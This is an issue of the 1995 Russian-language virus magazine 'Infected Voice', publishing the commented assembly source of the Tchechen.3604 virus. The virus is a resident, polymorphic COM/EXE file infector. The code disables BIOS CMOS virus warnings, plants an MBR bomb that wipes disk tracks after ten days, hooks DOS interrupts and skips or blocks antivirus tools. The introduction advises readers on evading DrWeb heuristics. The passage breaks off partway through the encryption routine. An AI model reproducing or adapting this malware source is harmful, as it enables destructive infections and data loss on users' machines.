     ▄▄                  █
    ▀▀▀  Virus Magazine  █ Box 10, Kiev 148, Ukraine       XII 1995
    ▀██ ▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ █ ▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ ▀ ▀▀▀▀▐▀▀▀  █▀▀▀▀▀▀█
     ▐█ █▀▄ █▀▀ ▄▀▀ ▄▀▀ ▄█▄ ▄▀▀ █▀█    ▌ █ ▄▀█ █ ▄▀▀ █▄▄   █ ▄▀▀▄ █ 
      █ █ █ █▀  █▀  █    █  █▀  █ █    █ █ █ █ █ █   █     █ ▄▀▀▄ █
      █ ▐ ▐ ▐   ▐▄▄ ▐▄▄  ▐  ▐▄▄ ▐▄▀     ▀█ ▀▄█ ▐ ▐▄▄ ▐▄▄▄  █ ▀▄▄▀ █
      ▐ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄  █▄▄▄▄▄▄█
      (C) Copyright,1994-95,by STEALTH group WorldWide, unLtd.
 

; Hе пойман - не вирус. Этим принципом руководствуемся мы при публикации
; исходников вирусов на страницах INFECTED VOICE.  Хороший вирус -усовершенст-
; вованный мертвый вирус. 
; Данный экземпляр мертв, хотя он и его штаммы будут еще долго плодиться и
; размножаться, принося свои плоды. Ведь есть такие му..жики, которые даже
; с Anti-EXE до сих пор не могут побороться. Или с нерезидентным вирусом,
; которого некий Hиколай Клочков лечил 4 дня с "продолжением следует" на
; страницах ComputerWorld Киев.

; Tchechen.3604 опознается и убивается DrWeb с версии 3.07 (3.06 ?)
; Однако, если вас это не устраивает, попробуйте:
;	-1- вставить в начало обработчика INT 21h что-нибудь, хотя бы NOP.
;       -2- перетасовать комманды в MBR'е до полного необнаружения в нем.
;       -3- вставить в Mayhem новый антиэвристический прием.
; Хотя трюк с конвейером заставляет Вебушку-импотентушку онанировать очень
; долго, но оргазм все же приходит и на экран выплескиваются слова "CRYPT..."
; и т.п.
; Эвристики скованы; если они будут позволять сиволическому исполнителю 
; слишком многое, это может плохо обернуться для юзеров. Экспериментируйте.
; Пишите в клуб, и мы шепнем на ушко пару приемчиков, которых заготовлено с 
; большим запасом. Или читайте конференции NasNet STEALTH.CONTACT и .PRIVATE.
;
; Итак, Tchechen.3604. Просмотрев исходник, вы увидите, насколько скупо было 
; описание в VIRLIST.WEB. 

; Тип:                 RCE
; Призрак:             MAYHEM Mutation Engine v1.0
; Стелс:               нет
; Посадка в память:    PSP:000Ah, после завершения программы
;                      Владелец блока:    MCB2+ (или MCB1+)

; Перехват INT 21h:    Таблица векторов
; Трассировка:         INT 13h , INT 21h
;                      Работа с файлами при INT 13h,21h установленных
;                      на оригинальные значения
; При работе обработчика INT 21h:
;                      заражение по 4B00h
;		       портами запрещает IRQ 0,1 (Timer, Keyboard)
;                      забивает INT 2Ah (защита от AVPTSR)

; Проявление:          сниамет Virus Warning в CMOS и записывает мину
;                      замедленного действия вместо MBR, которая стирает по 
;                      10 дорожек каждого логического диска через 10 дней.
;                      Мина сама передает управление на Boot-Sector.

;  ДЛЯ РАБОТЫ С ВИРУСОМ НЕОБХОДИМА БИБЛИОТЕКА МАКРОСОВ TCH-3604.MAC !!!

;  Ассемблер:      TASM 2.0, 2.5
;                  TASM 3.2 глухо виснет при компиляции

; Баги:
; 1. Интересный эффект наблюдался при тестировании на Pentium-90 :
;   вирус повис, но успел поменять в CMOS задержку перед загрузкой (там не 
;   было Virus Warning) При включении питания после тестирования памяти 
;   машина молчала секунд 30, после чего шла грузиться.
;   Hе работает на Pentium вероятно, из-за трюка с конвейером.
; 2. Award BIOS может не определиться из-за разницы написания "AWARD","Award".

; Публикуется с разрешения автора. 
; Tchechen (TM) is respectable Trademark of RUSSIAN BEAR.

;┌──────────────────────────────────────────────────────────────────────────┐
;│  THE TCHECHEN,  v2.1 (C) RUSSIAN BEAR, JULY,1995.                        │
;│  RELEASED 17.06.1995                                                     │
;│                                                                          │
;│      This is RCE-mutant virus, encrypted using MAYHEM v1.1.              │
;│      IT PERFORMS:       MBR 10-days bomb destroying hard disk,           │
;│                         CMOS VirusWarning disabling,                     │
;│    			   Sets BIOS's INT 13 when workin with INT21 and MBR│
;│                         Anti-TraceDetector & TraceDetector algorythms    │
;│    			   Memory possession thru PSP Terminate Address     │
;│    	                                                                    │
;│      MAYHEM v1.1:       Universal customized Mutation Engine.            │
;│                         Mixing code,changes registers and adds trash cmds│
;│                         Contains 2 anti-heuristic tricks to avoid WEB etc│
;│                                                                          │
;│      Version 2 is THE LAST FOR TCHECHEN VIRUS.                           │
;│      SEE YA SOON IN OTHER VIRIIS ! And Tchechens v2.* bugfixes           │ 
;│                                                                          │
;│                GREETINGS TO ALL WHO AIN'T AS OTHERS !                    │
 └──────────────────────────────────────────────────────────────────────────┘
; ───────────────────────────────────────────────────────────────────────────
; Перед распространением зашифровать текст в MBR по "XOR 40H" в .COM файле.
; ───────────────────────────────────────────────────────────────────────────
; CONSTANTS AND MACROS

  INCLUDE TCH-3604.MAC   ; MACROS:  BEEP,SMOV,SES,CLT,STT,PUSHALL,POPALL

  @PUSHF    EQU 9CH	 ; Некоторые комманды процессора
  @POPF	    EQU 9DH
  @IRET     EQU 0CFH
  @PFX_CS   EQU 2EH
  @MOV_DL   EQU 0B2H
  @JB       EQU 72H
  @JNB      EQU 73H
  @JAE      EQU @JNB
  @JA       EQU 77H

  PSPMEMTOP EQU 0002     ; Вершина доступной памяти
; ───────────────────────────────────────────────────────────────────────────
; LOCAL CONSTANTS AND MACROS
  VIRPARAS  EQU 200H	 ; 8Кб- размер занятой вирусом памяти
  STACKLEN  EQU 100H     ; предполагается для стека при проверке COM на >64К
; ───────────────────────────────────────────────────────────────────────────
.MODEL TINY
.CODE
 ORG 100H
 START0:
	JMP INIT			   ; JMP на вирус
 START:
        CALL $+3                	   ; Определим смещение начала вируса
	POP  SI
	SUB  SI,3
	MOV  CS:[SI][SISAVE-START],SI

        MOV AX,0F0EBH		   	   ; Есть ли мы в памяти ?
	INT 21H
	AFTERCHECK:		  ; Возврат сюда только, если вируса нет в 
				  ; памяти. Иначе IRET из 0F0EBh перейдет
				  ; на CUREINRAM

      	         ; Посадка в память: Этап 1.
		 ; Переносим тело за 3000h до MemTop - там его никто не затрет
                 ; Блок не выделяем.

        MOV AX,DS:[PSPMEMTOP]
        SUB AX,0300H             
                                  ; Перехватываем адрес завершения в PSP
				  ; для второго этапа инсталляции.
        LES  BX,DWORD PTR DS:[000AH]
	SES  CS:[SI][OLD22-START],BX
	MOV  WORD PTR DS:[000AH],MY22-START
	MOV  DS:[000CH],AX

	PUSH DS			  ; переносим тело
	SMOV DS,CS

        MOV  ES,AX              
	XOR  DI,DI
	PUSH SI
	MOV  CX,(INIT-START)/2
	CLD
	REP MOVSW

	POP  SI DS
					; Готовим стек для RETF 
        PUSH CS                   	
	MOV  AX,OFFSET CUREINRAM-START
	ADD  AX,SI			; Адрес CUREINRAM
	PUSH AX
					
        PUSH ES                         
	MOV  AX,OFFSET BEFORERUN-START	
	PUSH AX

	RETF

     BEFORERUN:
	
	PUSHALL
					   ; вышли из INT 13h
TRACE13: 				   ; Установка трассировки
				           ; захватываем вектор без сохранения
	XOR AX,AX			
	MOV ES,AX

	CLT				   ; Clear Trace Flag  
					   ; Макросы см. в конце
	MOV WORD PTR ES:[0004],TRACER13-START
	MOV ES:[0006],CS

	LES BX,DWORD PTR ES:[0013H*4]	   ; Адрес из таблицы
	MOV CS:[REAL13-START],BX	   
	MOV CS:[REAL13+2-START],ES	   
					   ; Если трассировка ничего не даст,
					   ; примем за оригинал табличное

	MOV BYTE PTR CS:[TRACER13-START],90H	; открыть процедуру
	MOV WORD PTR CS:[CMPSEG-START],0F000H
	MOV BYTE PTR CS:[CMPTYPE-START],@JB
	MOV WORD PTR CS:[DSTDIS-START],REAL13-START
	MOV WORD PTR CS:[DSTSEG-START],REAL13-START+2

	PUSHF				   ; Для CALL INT 13
	STT	 			   ; Тихо! Идет трассировка!

					   ; вызываем функцию INT 13h
	MOV  AH,08			   ; Допустим, получить параметры HD
	MOV  DL,80H			

CALL13:					   ; Вызов INT 13h
	DB 9AH				   
REAL13	DW ?,?
					   ; Прерывание завершено. 

	MOV  BYTE PTR CS:[TRACER13-START],0CFH	; IRET в начало обработчика

	CLT				   ; Clear Trace Flag

	JNC MBRFURTH		
	JMP MBRDONE
				; трогаем MBR
     MBRFURTH:
					; SAVE VALUES TO MBR
	AND CL,3FH
	MOV CS:[SECSCNT_+1-START],CL
	AND DH,3FH
	MOV CS:[HEADCNT__+2-START],DH
	
	SMOV ES,CS
	SMOV DS,CS
	MOV  AX,0201H			; READ MBR
	MOV  BX,DISKSECTOR-START
	MOV  CX,0001
	MOV  DX,0080H
	PUSHF
	CALL DWORD PTR CS:[REAL13-START]

	JNC  POSSTST
	JMP  MBRDONE

     POSSTST:

	CMP BYTE PTR ES:[BX],0FCH	; POSSESSED ?
	JNE MBRTOPOSS
	JMP MBRDONE

     MBRTOPOSS:

	MOV  BP,BIOSNAMES-START
	CALL SCANBIOSNAME		; MEGATRENDS?
	JZ   AMIISIT
	ADD  BP,[BP]
	INC  BP
	CALL SCANBIOSNAME               ; AWARD?
	JZ   AWARDISIT
	JMP  POSSNOW			; не AMI и не AWARD

				; AMERICAN TRENDS*1.000.000
  AMIISIT:			; BYTE 34h:  X*******  1=ENABLED
				; WORD 3Eh,3Fh:	       16 bit Checksum
	MOV  AL,34H
	OUT  70H,AL
	JMP  $+2
	IN   AL,71H

	TEST AL,80H		; VIRWARNING ?
	JZ   POSSNOW		; ZF=OFF

	SUB  AL,80H		; SET OFF

	PUSH AX
	MOV AL,34H		; WRITE TO CMOS
	OUT 70H,AL
	JMP $+2
	POP AX

	OUT 71H,AL

	MOV AL,3FH		; CORRECT CHECKSUM
	OUT 70H,AL
	JMP $+2
	IN AL,71H
	SUB AL,80H
	PUSHF
	PUSH AX

	MOV AL,3FH
	OUT 70H,AL
	JMP $+2
	POP AX
	OUT 71H,AL

	MOV AL,3EH		; старший байт
	OUT 70H,AL
	JMP $+2
	IN  AL,71H
	POPF
	SBB AL,0
	PUSH AX

	MOV AL,3EH
	OUT 70H,AL
	JMP $+2
	POP AX
	OUT 71H,AL

	JMP MBRDONE		; PROTECTION REMOVED, INFECT NEXTTIME

 AWARDISIT:

	MOV AL,03CH
	OUT 70H,AL
	JMP $+2
	IN  AL,71H
	TEST AL,10000000B	; Disabled=1 Enabled=0
	JNZ POSSNOW		; ZF=DISABLED

	OR   AL,10000000B	; SET OFF
	PUSH AX
	MOV AL,03CH
	OUT 70H,AL
	JMP $+2
	POP AX
	OUT 71H,AL

	JMP MBRDONE

 POSSNOW:

	MOV  SI,BX		; PARTITION TABLE
	ADD  SI,01BEH
        MOV  DI,MYMBR-START
        MOV  BX,DI
	ADD  DI,01BEH
	SMOV DS,ES
	MOV  CX,20H
	CLD
	REP  MOVSW

	PUSH AX BX CX DX		; DAY_X

	MOV AH,04
	INT 1AH
	JNC EVALDATE
	MOV DL,30H			; Error Getting date = 30th
	JMP SHORT ENDEVALDATE

EVALDATE:				; TEN DAYS LATER...
	ADD DL,10H
	CMP DL,30H
	JBE ENDEVALDATE			; IS IT CORRECT ?
	SUB DL,30H
ENDEVALDATE:

	MOV BYTE PTR DS:[BX][DAYX__+2-STARTMBR],DL
	POP DX CX BX AX

WRITEMBR:
	MOV  CX,0001
	MOV  BX,MYMBR-START
	MOV  DX,0080H
	MOV  AX,0301H
	PUSHF
	CALL DWORD PTR CS:[REAL13-START]

   MBRDONE:


   TRACE21:

	XOR AX,AX			
	MOV ES,AX

	CLT				   ; Clear Trace Flag  
					   ; Макросы см. в конце
	MOV WORD PTR ES:[0004],TRACER13-START
	MOV ES:[0006],CS

        LES BX,DWORD PTR ES:[0021H*4]      ; Адрес из таблицы
        MOV CS:[OLDINT21-START],BX
        MOV CS:[OLDINT21+2-START],ES
					   ; Если трассировка ничего не даст,
					   ; примем за оригинал табличное

	MOV BYTE PTR CS:[TRACER13-START],90H	; открыть процедуру

	PUSH DS
	MOV AX,1203H
	INT 2FH
	MOV WORD PTR CS:[CMPSEG-START],DS
	POP DS

        MOV BYTE PTR CS:[CMPTYPE-START],@JA
        MOV WORD PTR CS:[DSTDIS-START],OLDINT21-START
        MOV WORD PTR CS:[DSTSEG-START],OLDINT21-START+2

        PUSHF                              ; Для CALL INT 21
	STT	 			   ; Тихо! Идет трассировка!

                                           ; вызываем функцию INT 21h
        MOV  AH,30H                        ; Допустим, получить версию DOS
CALL21:                                    ; Вызов INT 21h

	CALL DWORD PTR CS:[OLDINT21-START]
					   ; Прерывание завершено. 

	MOV  BYTE PTR CS:[TRACER13-START],0CFH	; IRET в начало обработчика

	CLT				   ; Clear Trace Flag

;------------------------------------------------------------------------
        POPALL                  ; !!!!!!!!!!!!!!!!!!!!!!!!!
	RETF			; TO CUREINRAM

   MY22:		     ; Программа завершилась. Мы получили управление.

	MOV  AH,48H	     ; Отгрызаем 8 Kb.
	MOV  BX,0201H
	INT  21H	     
			; Скроем настоящих родителей нашего bastard'a.
			; Теперь папа "золотого ребенка" - MS-DOS. Он молчит.
			; Ему стыдно об этом даже на карте памяти написать!
	PUSH AX		
	MOV  AH,52H
	INT  21H		
	MOV  BX,ES:[BX-2]		; Первый MCB
	INC  BX
	POP  AX

	MOV  ES,AX

	DEC  AX
	MOV  DS,AX
        MOV  WORD PTR DS:[0001],BX	; Владелец вируса - блок с MCB No.1

	SMOV DS,CS
					; На постоянную квартиру - в законно
					; выделенный блок. С вещами.
	XOR  SI,SI
	XOR  DI,DI
	MOV  CX,(INIT-START)/2+2
	CLD
	REP  MOVSW			; переносимся...
					; Перехватываем INT 21h. Не делайте 
					; так. Лучше трассировка и сплайсинг.
;-----------------------------------------------------------------------------
	XOR  AX,AX
	MOV  DS,AX
	MOV  WORD PTR DS:[21H*4],OFFSET VIR21-START
	MOV  DS:[21H*4+2],ES
;-----------------------------------------------------------------------------
	DB 0EAH				; на оригинальный обработчик INT 22h
	OLD22 DW ?,?

CUREINRAM:			  ; Вирус все сделал. Восстановим программу
				  ; и передадим ей управление.
	SISAVE EQU $+1
        MOV  SI,0000	          ; Адрес начала вируса - см.в начале
        SMOV ES,DS

      DIRECTOR:
	JMP SHORT CUREASCOM	  ; Вместо флагов и проверок при заражении
				  ; меняем операнд JMP'а - на восстановление
				  ; EXE или же COM.

CUREASCOM:			  ; возврат 3-х байт 
	   CLD 
	   MOV DI,0100H

	   MOV AX,CS:[SI][ORIG_3-START]
	   STOSW
	   MOV AL,CS:[SI][ORIG_3+2-START]
	   STOSB

	   XOR  AX,AX		   ; 
	   PUSH AX		   ; Теперь нас не заботит, равно ли SP 0FFFEh
				   ; Наверху в стеке будет 0, что и нужно COM.
	   INC  AH		
	   JMP  AX		   ; Готово!

	   ORIG_3 DB 90H,0CDH,20H  ; Байтики настоящего начала

CUREASEXE:			   ; Восстанавливаем CS:IP и SS:SP для EXE

	MOV AX,DS
	ADD AX,10H		   ;  0000:0000=(PSP+10):0000

	ADD CS:[SI][OLDCS-START],AX	; настройка CS,SS
	ADD CS:[SI][OLDSS-START],AX	 
	CLI
	JMP SHORT $+2		   ; для сброса конвейера (т.к. меняем комман-
				   ; ды в пределах 16 байт)
	OLDSP EQU $+1
	MOV SP,0000
	OLDSS EQU $+1
	MOV AX,0000
	MOV SS,AX
	STI
	DB 0EAH			   ; переход на EntryPoint EXE-шника
OLDIP   DW 0000
OLDCS   DW 0000

	; ОБРАБОТЧИК INT 21h -----------------------------------------------
VIR21: 
	;---KILL EM ALL-----------------------------------------------------

	PUSH AX DI ES
	
	IN  AL,21H		   ; Disable IRQ Timer & Keyboard
	MOV CS:[PORT21-START],AL
	OR  AL,00000011B
				   ; Set INT 2Ah handler to "IRET"
				   ; Борьба с AVPTSR.
	XOR DI,DI
	MOV ES,DI
	LES DI,ES:[002AH*4]
	MOV AL,ES:[DI]
	MOV CS:[OLD_2A_BYTE-START],AL
	MOV AL,0CFH
	CLD
	STOSB
	
	POP ES DI AX	

	;-------------------------------------------------------------------
			; Антитрассировочный прием AVPTSR'а. Поставить сюда
			; его легче, чем кому-то потом обходить.
	PUSH AX				
	PUSHF
	POP AX
	TEST AH,01
	POP AX
	JZ NO_TRACE	
	STC 		; Если трассируют, то сразу IRET
	RETF 0002
	NO_TRACE:
	
	XCHG AX,BX	; Для любителей смотреть на "CMP AX,4B00h"
	ADD  BH,01DH
	CMP  BX,00DEBH	; ...и на вирусные функции (0F0EBh) проверки себя
	JNE  NXTFNC

	POP  AX				; Без пересадки летим на CureInRAM.
	ADD  AX,CUREINRAM-AFTERCHECK
	PUSH AX
	IRET

     NXTFNC:				
	CMP BX,4B00H+1D00H		
	JE  EXECIT
	SUB BH,1DH			
	XCHG AX,BX
	JMP JMPOLDDOS
     EXECIT:			; ---------- Обработка функции Exec (4B00h)
	SUB BH,1DH
	XCHG AX,BX
	PUSHALL
         			        ; Проверка доступа к файлу
	PUSH DX SI DS ES 		

	SMOV ES,CS

        MOV SI,DX	 	        ; Получить букву диска
	XOR DH,DH
	MOV DL,DS:[SI]

	AND DL,0DFH	                ; UpperCase
        SUB DL,41H
	MOV CS:[CURRDISK-START],DL

        CMP DL,2
        JB  NOTHD
				        ; Для HardDisk: BIOS'овский INT_13h
	XOR  DX,DX				
	MOV  DS,DX
	LES  SI,DWORD PTR DS:[0013H*4]	; сохраним нынешний вектор INT_13h
	SES  CS:[OLD13-START],SI
	LES  SI,DWORD PTR CS:[REAL13-START]
	SES  DS:[0013H*4],SI
     NOTHD:
	POP ES DS SI DX 
ENDTESTACCESS:
					; Не тронь говна - вонять не будет.
	PUSH AX CX ES			
	SMOV ES,DS

	MOV  DI,DX			; Находим имя файла из PATHNAME
	MOV  CL,0FFH
	XOR  AL,AL
	REPNE SCASB
	STD
	MOV AL,'\'
	REPNE SCASB
	CLD
	MOV AX,ES:[DI][0002]
	POP ES CX

	CMP AX,'EW'		; WEB   
	JE  TABOOIS 
	CMP AX,'DA'		; ADinf
	JE  TABOOIS
	CMP AX,'IA'		; AIdstest немощный
	JE  TABOOIS
	CMP AX,'OC'		; COMMAND.COM непригоден для посадки с него 
	JE  TABOOIS		;             в память
	CMP AX,'RD'             ; DRweb тугодумный, деградирующий в Aidstest
	JE  TABOOIS
	CMP AX,'VA'		; AVP. Ужасно медленный WEBообразный
	JE  TABOOIS
	CMP AX,'BT'		; TBAV: Пиздун-громовержец. Эвристико-фаг.
	JE  TABOOIS		
	CMP AX,'HC'		; CHkdsk просто виснет наглухо. Не трогайте.	
    TABOOIS:
	POP AX
	JNE ENDTABOO
	JMP EXECEXIT
ENDTABOO:			
				; Открываем файл для чтения
	MOV  AX,3D02H
	CALL CALLDOS
	JNC  MMM1
	
	CMP  BYTE PTR CS:[CURRDISK-START],2  ; не винт - не восстанавливаем
	JNB  CHNGBACK
	JMP  CLOSEPOPEXIT

    CHNGBACK:					
	CALL BACK13		; может на Stacker какой напоролись ? 
				; поставим INT 13 назад и попробуем еще раз
	MOV  AX,3D02H
	CALL CALLDOS
	JNC  MMM1
	JMP  CLOSEPOPEXIT
MMM1:
	CMP BYTE PTR CS:[CURRDISK-START],2
	JNB PROTABS
	
	PUSH AX CX DX		;  Проверяем презерватив на дискете.
	MOV DX,3F5H
	MOV AL,4
	OUT DX,AL
	MOV CX,400H
	LOOP $
	MOV AL,4
	OUT DX,AL
	MOV CH,4
	LOOP $
	IN  AL,DX
	TEST AL,40H
	POP DX CX AX
	JZ PROTABS		; ZF=Дискета без презерватива. Душман каюк!
	JMP CLOSEPOPEXIT

     PROTABS:			

	XCHG AX,BX			
	SMOV DS,CS

	MOV AX,5700H
	CALL CALLDOS	
	MOV CS:[FTIME-START],CX
	MOV CS:[FDATE-START],DX
;---------------------------------------

█  SELFINFTEST:				; самопроверка на зараженность

	MOV AX,4202H
	MOV CX,-1
	MOV DX,-3
	CALL CALLDOS

	MOV AH,3FH			; читаем 3 байта в конце
	MOV CX,0003
	PUSH CX
	MOV DX,ORIGINAL-START
	CALL CALLDOS
	POP CX
	JC TEE

	CMP AX,CX			
	JNZ TEE

	MOV AX,DS:[ORIGINAL-START]    ; Разность двух предпоследних байт =-24h
	SUB AH,AL
	CMP AH,24H
	JE TEE			
█ ENDINFTEST:		

SETDIRECTOR:
	MOV BYTE PTR DS:[DIRECTOR+1-START],00		; "JMP CUREASCOM"
GETORIGINAL:
	CALL FSEEK0

	MOV AH,3FH				 ; чтение заголовка файла
	MOV CX,18H
	PUSH CX
	MOV DX,ORIGINAL-START
	CALL CALLDOS
	XCHG DX,SI
	POP CX
	JC TEE

	SUB CX,AX
	JZ WHATTYPE
TEE:	JMP EXECEXIT

WHATTYPE:					; EXE или нет(COM) ?
	CMP [SI],'ZM'		
	JE  EXEISIT
	CMP [SI],'MZ'
	JE  EXEISIT

███ COMISIT:					; обработка COM

	MOV DX,DS:[ORIGINAL-START]		; сохранить 3 первых байта
	MOV DS:[ORIG_3-START],DX
	MOV DL,DS:[ORIGINAL-START+2]
	MOV DS:[ORIG_3+2-START],DL

	CALL FSEEK2
LENTEST:
	MOV DS:[JMPERARG-START],AX		; не короче своего размера
	CMP AX,ENDALL-START 	
	JB  TEE3
MMM323:	ADD AX,100H				; не длиннее...
	MOV DS:[VARSRC-START],AX      ; EntryPoint нового экземпл.(для MAYHEM)
	ADD AX,ENDALL-START+STACKLEN		; ... 64K-Стек-Тело
	JC TEE3

	ADD WORD PTR DS:[JMPERARG-START],INIT-START-3	; JMP на тело

	CALL WRITETAIL
	JC TEE3

	CALL FSEEK0			; пишем новое начало
	MOV AH,40H
	MOV CX,3
	PUSH CX
	MOV DX,OFFSET JMPER-START
	CALL CALLDOS
	POP CX
	JC TEE3

	JMP NEWGENERATION
TEE3:	JMP EXECEXIT
;----

███ EXEISIT:				; Обработка EXEшников.

ISWINEXE:		; А не форточкин ли это "новый ехе"?
			; Это не правило, но по смещению 0400h у них "NE"
	PUSH SI

	MOV AX,4200H
	XOR CX,CX
	MOV DX,0400H
	CALL CALLDOS
	
	MOV AH,3FH
	MOV CX,0002
	MOV DX,OFFS400-START
	CALL CALLDOS
	JNC  M232
	POP SI
	JMP WINTSTEXIT	
M232:	XCHG DX,SI
	CMP  [SI],'EN'
	POP  SI
	JE  TEE4		; ExecExit
WINTSTEXIT:

SAVEHDR:			; для восстановления сохраним CS:IP,SS:SP
	MOV AX,[SI+0EH]
	MOV DS:[OLDSS-START],AX
	MOV AX,[SI+10H]
	MOV DS:[OLDSP-START],AX
	MOV AX,[SI+14H]
	MOV DS:[OLDIP-START],AX
	MOV AX,[SI+16H]
	MOV DS:[OLDCS-START],AX

NEWEP:
	CALL FSEEK2		; Возврат: DX:AX=длина файла
				
	PUSH AX			; получаем число 512б. блоков из длины файла
	PUSH DX			
	DIV WORD PTR DS:[MUL200-START]
	OR DX,DX
	JZ NOINC		
	INC AX
   NOINC:
	CMP AX,[SI+4]		; сравниваем число блоков с заголовочным
	POP DX
	POP AX
	JA TEE4			; на самом деле больше- файл сегментированный,
				; при заражении будет испорчен - не трогаем.

   GOODEXE:					; Подходящий файл.

	DIV WORD PTR DS:[MUL10-START]		; Параграфов в файле
	SUB AX,[SI+08]				; минус параграфов заголовка
	MOV DS:[VARSRC-START],DX		; Сохраним для MAYHEM: начало
	ADD DX,INIT-START			; + смещ. начала расшифровщика
	MOV [SI+14H],DX			; IP		
	ADD DX,ENDALL-INIT+2048D	
	MOV [SI+10H],DX			; SP
	MOV [SI+16H],AX			; CS
	ADD AX,100H			; ThunderByte замечает SS=CS.
	MOV [SI+0EH],AX			; SS

SETDIRECTOREXE:
	MOV BYTE PTR DS:[DIRECTOR+1-START],CUREASEXE-DIRECTOR-2	 ;  CureAsEXE

	CALL WRITETAIL			; шифруем и пишем хвост	
	JNC SETSIZE
TEE4:	JMP EXECEXIT

SETSIZE:		; из-за переменного инсталлятора изменился размер
			; надо подкорректировать заголовок
	CALL FSEEK2	; заносим реальную длину в заголовок
	DIV  WORD PTR DS:[MUL200-START]
	OR   DX,DX
	JZ   NOINCNOW
	INC  AX
    NOINCNOW:
	MOV SI,OFFSET ORIGINAL-START
	MOV DS:[SI+4],AX
	MOV DS:[SI+2],DX
WRITEHEA:				; пишем заголовок
	CALL FSEEK0

	MOV AH,40H
	MOV DX,ORIGINAL-START
	MOV CX,0018H
	CALL CALLDOS

  NEWGENERATION:
	INC WORD PTR DS:[GENCNT-START]		; счетчик поколений

███ EXECEXIT:				; время и дату - назад
	MOV AX,5701H
	FDATE EQU $+1
	MOV DX,0000
	FTIME EQU $+1
	MOV CX,0000
	CALL CALLDOS

CLOSEPOPEXIT:	
	MOV AH,3EH
	CALL CALLDOS

ONLYPOP:
	XOR AX,AX				; Снимем BIOSовский INT 13 
	MOV DS,AX				; Вернем табличный вектор
	LES DI,CS:[OLD13-START]
	SES DS:[0013H*4],DI

	POPALL					
	JMP JMPOLDDOS

JMPER    DB 0E9H
JMPERARG DW 0000

JMPOLDDOS:
	
	;------------- RESURRECT ALL LIVING

	PUSH AX ES DI

	PORT21 EQU $+1			; Restore Old Value
	MOV AL,00
	OUT 21H,AL

	XOR AX,AX
	MOV ES,AX
	LES DWORD PTR DI,ES:[002AH*4]
	OLD_2A_BYTE EQU $+1
	MOV AL,00
	CLD
	STOSB

	POP DI ES AX

	 DB 0EAH
OLDINT21 DW 0000
	 DW 0000
MUL200   DW 0200H
MUL10    DW 0010H
GENCNT   DW 0001

█ WRITETAIL:			; шифрование вируса и допись тела к файлу
        CALL CRYPTMASTER	; шифруем

	IN   AL,40H		; добавляем признак зараженности к концу	
	MOV  AH,AL
	SUB  AL,24H
	STOSW
	IN   AL,40H
	STOSB

	SUB  DI,(OFFSET BODYPREPARE-START)
	PUSH DI

	CALL FSEEK2
				; дописываем вирус к файлу
	POP  CX		
	MOV  AH,40H
	MOV  DX,BODYPREPARE-START 	
	CALL CALLDOS
	
	MOV AH,68H		; Flush buffers для нахождения НОВОЙ длины
	CALL CALLDOS		; файла по FSeek (4202h)

	RETN

█  FSEEK2:
	MOV AX,4202H
	JMP SHORT ZERO0110
█  FSEEK0:
	MOV AX,4200H
█  ZERO0110:
	XOR CX,CX
	XOR DX,DX
███ CALLDOS:
	PUSHF
	CALL DWORD PTR CS:[OFFSET OLDINT21-START]
	RETN

TRACER13 PROC
	DB   90H				; Сюда будет записан код IRET
						; по достижению результата

	MOV  CS:[BPSAVE-START],BP		; сохраним регистры
	MOV  CS:[SISAVE_-START],SI
	MOV  CS:[DSSAVE-START],DS
	MOV  CS:[AXSAVE-START],AX
	POP  SI DS AX				; Все, необходимое для IRET
						; DS:SI=Адрес след. комманды
						;    AX=Flags
	PUSH AX					
	MOV  AX,DS				; Сегмент BIOS ?
	CMPSEG EQU $+1
	CMP  AX,0F000H
	POP  AX
	CMPTYPE EQU $
	JB   NOTREAL		
						; Сегмент BIOS
						; Сохраняем адрес - это и есть
	DSTDIS EQU $+3
	MOV  CS:[REAL13-START],SI		; точка входа в INT 13h
	DSTSEG EQU $+3
	MOV  CS:[REAL13-START+2],DS

	AND  AH,0FEH				; снимает флаг трассировки
	MOV  BYTE PTR CS:[TRACER13-START],0CFH	; IRET в начало обработчика
	JMP  ALLBACK

     NOTREAL:					; BIOS не достигнут
	MOV BP,SP

	CMP BYTE PTR DS:[SI],@PUSHF		; следующая комманда - PUSHF
	JNE NXTT

	INC  SI					; IRET на комманду после PUSHF
	PUSH AX					; Сами делаем PUSHF
	AND BYTE PTR [BP-1],0FEH		; Чистим TF во "флагах"

     ALLBACK:					; выход
	PUSH AX DS SI				; набор для IRET - в стек
        SISAVE_ EQU $+1    			; восстанавливаем регистры
	MOV  SI,0000
	DSSAVE  EQU $+1
	MOV  AX,0000
	MOV  DS,AX
	AXSAVE  EQU $+1
	MOV  AX,0000
	BPSAVE  EQU $+1
	MOV  BP,0000				
	IRET					

     NXTT:					
	CMP BYTE PTR DS:[SI],@POPF		
	JNE NXTT2
						; след. комманда - POPF
	OR WORD PTR [BP],0100H			; Устанавливаем TF
	JMP ALLBACK

     NXTT2:
	CMP BYTE PTR DS:[SI],@IRET
	JNE ALLBACK
						; след. комманда - IRET 
	OR WORD PTR [BP+04],0100H		; Устанавливаем TF во флагах
	JMP ALLBACK	

TRACER13 ENDP
 ──────────────────────────────────────────────────────────────────────────────
;----------------------------------------------------------------------
CRYPTMASTER:

       PUSH BX					; File Handle

       SMOV ES,DS
       XOR  SI,SI
       MOV  DI,OFFSET BODYPREPARE-START
       MOV  CX,(OFFSET INIT-START)/2
       CLD
       REP  MOVSW
				      ; восстановим первоначальный вид вируса:
				      ; закрытые стрелки и конвейерные штучки

       CALL RNDW		      ; ключ для XOR
       MOV  DS:[VARXOR-START],DX      ; Для MAYHEM

       PUSH DX			      
       CALL RNDW	
       MOV  AX,DX
       POP  DX

       MOV  DS:[VARDIS-START],AX

       MOV SI,BODYPREPARE-START       ; шифруем по XOR
       MOV CX,(INIT-START)/2
MXOR:  XOR [SI],DX
       ADD DX,AX
       INC SI
       INC SI
       LOOP MXOR

;----------------------------------- Приготовления к запуску MAYHEM ---------
RUNMAYHEM: 
      		
				 ; Занесем в стек адрес для возврата из MAYHEM
       PUSH DS:[VARSRC-START]   	
       POP  DS:[VARRETF-START]	
       PUSH CS			       
       MOV  AX,AFTERMAYHEM-START         
       PUSH AX
				 ; Занесем в стек адрес для перехода в MAYHEM
       MOV  AX,DS                       
       ADD  AX,(MAYHEM-START)/10H  ; всегда выровнена на параграф
       MOV  DS,AX		   ; Требуется: DS=CS 
